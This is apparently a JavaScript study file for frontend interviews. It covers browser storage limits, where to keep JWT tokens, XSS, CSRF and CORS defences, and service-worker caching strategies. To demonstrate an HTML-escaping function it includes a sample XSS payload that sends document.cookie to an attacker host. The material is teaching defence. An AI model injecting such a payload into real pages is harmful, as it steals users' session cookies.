'use strict';

/**
 * ========================================================================
 * 05. BROWSER STORAGE, OFFLINE ARCHITECTURE & SECURITY [⚡ CHIRAG GOEL]
 * ========================================================================
 * SOURCE: Chirag Goel (Frontend System Design)
 *
 * STORAGE SPECTRUM:
 * ┌──────────────┬─────────────┬──────────────┬────────────┬────────────┐
 * │ Storage Type │ Capacity    │ Synchronous? │ Sent to Svr│ Lifespan   │
 * ├──────────────┼─────────────┼──────────────┼────────────┼────────────┤
 * │ Cookie       │ ~ 4 KB      │ Sync         │ Yes (auto) │ By Max-Age │
 * │ LocalStorage │ ~ 5 - 10 MB │ Sync (blocks)│ No         │ Permanent  │
 * │ SessionStore │ ~ 5 - 10 MB │ Sync (blocks)│ No         │ Tab close  │
 * │ IndexedDB    │ > 500 MB+   │ Async (non-b)│ No         │ Permanent  │
 * │ Cache API    │ > 1 GB+     │ Async (SW)   │ No         │ Managed    │
 * └──────────────┴─────────────┴──────────────┴────────────┴────────────┘
 */

/**
 * ========================================================================
 * 1. WHERE SHOULD YOU STORE AUTH JWT TOKENS? (TOP INTERVIEW QUESTION!)
 * ========================================================================
 * Option A: LocalStorage
 * - ❌ HIGH RISK: Any third-party npm package, analytics script, or XSS flaw
 *   can read `localStorage.getItem('token')` and exfiltrate the token!
 *
 * Option B: HttpOnly, Secure, SameSite=Strict Cookies (🌟 INDUSTRY STANDARD)
 * - ✅ Cannot be read by JavaScript `document.cookie`.
 * - Immune to XSS token theft!
 * - Protected against CSRF by setting `SameSite=Strict` or `Lax`.
 *
 * Option C: In-Memory (React state) + Refresh Token in HttpOnly Cookie
 * - Access token lives in JS memory (lost on page refresh, restored via silent refresh call).
 */

/**
 * ========================================================================
 * 2. WEB SECURITY TRIFECTA: XSS, CSRF & CORS
 * ========================================================================
 *
 * 1. XSS (Cross-Site Scripting):
 *    - Attacker injects malicious `<script>` into your page.
 *    - Defense:
 *      a. Sanitize user-generated HTML using DOMPurify before `dangerouslySetInnerHTML`.
 *      b. Use Content Security Policy (CSP) headers:
 *         `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com;`
 *
 * 2. CSRF (Cross-Site Request Forgery):
 *    - Evil site tricks user browser into sending unauthorized requests to your bank.
 *    - Defense:
 *      a. SameSite Cookie attribute (Strict / Lax).
 *      b. Anti-CSRF Token verified in request headers (`X-CSRF-Token`).
 *
 * 3. CORS (Cross-Origin Resource Sharing):
 *    - Browser security mechanism enforcing Same-Origin Policy (Protocol + Domain + Port).
 *    - Preflight `OPTIONS` request sent for non-simple requests (methods other than GET/POST or custom headers).
 *    - Server must return `Access-Control-Allow-Origin: https://myapp.com`.
 */

// Simulation of Input Sanitization against XSS
function sanitizeUserInput(dirtyHtml) {
  return dirtyHtml
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

const maliciousPayload = '<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script>';
console.log('--- XSS Prevention Demonstration ---');
console.log('Original attack payload:', maliciousPayload);
console.log('Sanitized safe output:', sanitizeUserInput(maliciousPayload));

/**
 * ========================================================================
 * 3. SERVICE WORKERS & PWA OFFLINE CACHING STRATEGIES
 * ========================================================================
 * - Cache-First: Serve from Cache immediately; fallback to Network (Images, Fonts).
 * - Network-First: Try Network first; fallback to Cache if offline (News feed, stock prices).
 * - Stale-While-Revalidate: Return cached data instantly; fetch fresh data in background to update cache (Social feeds, Dashboard metrics).
 */
